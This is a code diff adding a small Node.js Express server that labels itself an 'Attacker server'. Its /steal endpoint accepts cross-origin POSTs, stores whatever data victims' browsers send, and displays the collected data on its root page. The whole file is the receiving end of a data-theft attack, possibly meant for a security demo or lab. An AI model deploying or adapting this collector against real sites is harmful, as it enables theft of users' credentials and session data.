@@ -1,0 +1,12 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const path = require('path');
+const app = express();
+const PORT = 4000;
+let stolen = [];
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public')));
+app.use((req, res, next) => { res.setHeader('Access-Control-Allow-Origin', '*'); next(); });
+app.post('/steal', (req, res) => { stolen.push({ time: new Date(), data: req.body }); console.log('💥', req.body); res.status(204).end(); });
+app.get('/', (req, res) => { res.send(`<pre>${JSON.stringify(stolen)}</pre>`); });
+app.listen(PORT, () => console.log(`⚠️ Attacker server: http://localhost:${PORT}`));
